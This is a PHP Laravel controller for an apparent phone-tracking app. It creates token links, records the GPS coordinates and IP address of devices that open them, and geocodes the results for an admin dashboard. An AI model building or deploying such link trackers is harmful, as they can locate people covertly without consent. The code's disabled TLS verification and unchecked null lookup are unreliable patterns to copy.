<?php

namespace App\Http\Controllers;

use App\Models\GenerateLink;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;

class LocationController extends Controller
{
    public function original()
    {
        return view('original');
    }

    public function trackingDashboard()
    {
        return view('tracking.phone-tracking-dashboard');
    }

    public function GPSDashboard()
    {
        return view('tracking.gps-dashboard');
    }

    public function generateLink()
    {
        $Links = GenerateLink::orderBy('id', 'desc')->paginate(10);
        $Activated = GenerateLink::where('gl_active_status', 1)->get();
        $DeActivated = GenerateLink::where('gl_active_status', 0)->get();
        return view('tracking.generate-link', compact(['Links', 'Activated', 'DeActivated']));
    }

    public function createTrackLink()
    {
        return view('tracking.create-track-link');
    }

    public function activateTrackLink()
    {
        $Links = GenerateLink::orderBy('id', 'desc')
            ->where('gl_active_status', 1)
            ->paginate(10);

        return view('tracking.activate-track-link', compact(['Links']));
    }

    public function deActivateTrackLink()
    {

        $Links = GenerateLink::orderBy('id', 'desc')
            ->where('gl_active_status', 0)
            ->paginate(10);

        return view('tracking.de-activate-track-link', compact(['Links']));
    }

    public function generateTrackingLink()
    {
        $token = Str::random(30);
        $generatedLink = url('pts', $token);

        return response()->json([
            'success' => true,
            'link' => $generatedLink,
        ]);
    }

    public function saveTrackingLink(Request $request)
    {
        try {
            $validated = $request->validate([
                'link' => 'required|string|url',
                'device_ip' => 'nullable|string',
            ]);

            $post = new GenerateLink;
            $post->gl_links = $validated['link'];
            $post->gl_device_ip = $validated['device_ip'] ?? $request->ip();
            $post->gl_added_by = Session('LoggedAdmin') ?? 'System';
            $post->gl_date_added = time();
            $post->save();

            // AuditTrailController::register('TRACK LINK GENERATED', 'ADMIN Username: <b>' . Helper::full_name(Session('LoggedAdmin')) . '</b> Pasword: <b>*******</b>');

            return response()->json(['success' => true, 'message' => 'Link saved successfully']);
        } catch (\Exception $e) {

            \Log::error('Error saving link:', [
                'message' => $e->getMessage(),
                'request_data' => $request->all(),
            ]);

            return response()->json(['success' => false, 'message' => 'Error saving link'], 500);
        }
    }

    public function statusUpdate($id)
    {
        $ipStatus = GenerateLink::where('id', $id)->value('gl_active_status');

        $post = GenerateLink::find($id);

        if ($ipStatus == 0) {
            $post->gl_active_status = 1;
            // AuditTrailController::register('TRACK LINK ACTIVATED', 'ADMIN Username: <b>' . Helper::full_name(Session('LoggedAdmin')) . '</b> Pasword: <b>*******</b>');

        } else {
            $post->gl_active_status = 0;
            // AuditTrailController::register('TRACK LINK DE-ACTIVATED', 'ADMIN Username: <b>' . Helper::full_name(Session('LoggedAdmin')) . '</b> Pasword: <b>*******</b>');

        }
        $post->save();

        return back();

    }

    public function trackLink($token)
    {

        $link = GenerateLink::where('gl_links', 'like', '%' . $token . '%')->first();
        $userLink = $link->gl_links;
        $LinkId = $link->id;

        if (!$link) {
            return response()->json(['error' => 'Link not found'], 404);
        }

        return view('user-collection', compact(['userLink', 'LinkId']));
    }

    public function storeUserLocation(Request $request)
    {
        try {
            $longitude = $request->longitude;
            $latitude = $request->latitude;
            $userLink = $request->userLink;
            $LinkId = $request->LinkId;
            $ip = $request->ip;

            $LinkUpdated = GenerateLink::find($LinkId);

            if ($LinkUpdated && $LinkUpdated->gl_active_status === 1) {

                $LinkUpdated->gl_device_ip = $ip;
                $LinkUpdated->gl_latitude = $latitude ?? null;
                $LinkUpdated->gl_longitude = $longitude ?? null;
                $LinkUpdated->gl_tracker_counter = $LinkUpdated->gl_tracker_counter + 1;
                $LinkUpdated->save();

                // AuditTrailController::register('LINK LOCATION ', 'ADMIN Username: <b>' . $userLink . '</b> STORED: <b>*******</b>');

                Session::flash('success', 'Location stored successfully!');
                return response()->json([
                    'status' => true,
                ]);
            }

            return response()->json([
                'status' => false,
                'error' => 'Link not found or inactive',
            ]);

        } catch (\Exception $e) {
            
            \Log::error('Error storing location: ' . $e->getMessage());

            return response()->json([
                'status' => false,
                'error' => 'Error: ' . $e->getMessage(), 
            ]);
        }
    }

    public function handleLinkClick($id)
    {
        $link = GenerateLink::find($id);

        if ($link) {
            return view('tracking.collected-information', [
                'latitude' => $link->gl_latitude,
                'longitude' => $link->gl_longitude,
                'ip' => $link->gl_device_ip,
            ]);
        }

        abort(404, 'Link not found');
    }

    public function store(Request $request)
    {
        try {
            Log::info('Store method hit'); 
            $latitude = $request->latitude;
            $longitude = $request->longitude;
            $ip = $request->ip;

            Log::info('Latitude: ' . $latitude . ' Longitude: ' . $longitude . ' IP: ' . $ip);

            $googleApiKey = env('GOOGLE_MAPS_API_KEY');
            $geoResponse = Http::withOptions([
                'verify' => false,
            ])->get("https://maps.googleapis.com/maps/api/geocode/json", [
                'latlng' => "$latitude,$longitude",
                'key' => $googleApiKey,
            ]);

            Log::info('GeoResponse: ' . json_encode($geoResponse->json())); 

            $geoData = $geoResponse->json();

            if (!isset($geoData['status']) || $geoData['status'] !== 'OK') {
                throw new Exception('Failed to fetch location details from Google Maps API.');
            }

            $ipApiKey = env('IPSTACK_API_KEY');
            $ipResponse = Http::get("https://ipapi.co/{$ip}/json/");
            $ipData = $ipResponse->json();

            return response()->json([
                'geoData' => [
                    'formatted_address' => $geoData['results'][0]['formatted_address'] ?? 'N/A',
                    'location_details' => $geoData['results'][0] ?? [],
                ],
                'ipData' => $ipData,
            ]);
        } catch (Exception $e) {
            Log::error('Error: ' . $e->getMessage()); 
            return response()->json(['error' => $e->getMessage()], 500);
        }
    }

}
